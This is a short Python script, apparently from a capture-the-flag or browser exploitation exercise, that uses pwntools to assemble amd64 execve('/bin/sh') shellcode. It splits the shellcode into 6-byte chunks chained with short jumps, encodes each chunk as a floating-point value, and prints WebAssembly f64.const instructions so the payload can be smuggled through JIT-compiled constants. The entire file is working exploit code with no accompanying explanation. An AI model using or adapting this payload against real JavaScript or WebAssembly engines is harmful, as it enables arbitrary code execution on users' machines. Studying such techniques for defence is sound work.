#!/usr/bin/env python3

import struct

from pwn import *

context.arch = "amd64"

# based off shellcraft.amd64.linux.execve(path='/bin/sh')
sc = '''
    push 0x68732f6e
    pop rax
    push 0x69622f
    pop rbx
    shl rax, 24
    add rax, rbx
    xor rbx, rbx
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
'''


def packshellcode(sc, n):  # packs shellcode into n-byte blocks
    ret = []
    cur = b""
    for line in sc.splitlines():
        print(line)
        k = asm(line)
        print(k)
        assert (len(k) <= n)
        if (len(cur) + len(k) <= n):
            cur += k
        else:
            ret += [cur.ljust(6, b"\x90")]  # pad with NOPs
            cur = k

    ret += [cur.ljust(6, b"\x90")]
    return ret


# SC = packshellcode(sc, 6)
# print(SC)

SC = [
    b'hn/shX',
    b'h/bi\x00[',
    b'H\xc1\xe0\x18\x90\x90',
    b'H\x01\xd8H1\xdb',
    b'PH\x89\xe71\xd2',
    b'1\xf6j;X\x90',
    b'\x0f\x05\x90\x90\x90\x90']

# Ensure no repeat of 6 byte blocks
D = dict(zip(SC, [SC.count(x) for x in SC]))
assert (max(D.values()) == 1)

# short jmp rel8: https://www.felixcloutier.com/x86/jmp
jmp = b'\xeb'

# add jumps after each 6 byte block
SC = [(x + jmp + b"\x07") for x in SC]

SC = [struct.unpack('<d', x)[0] for x in SC]  # represent as doubles

for i in SC:
    print(f"f64.const {i}")

for i in range(len(SC) - 1):
    print("drop")
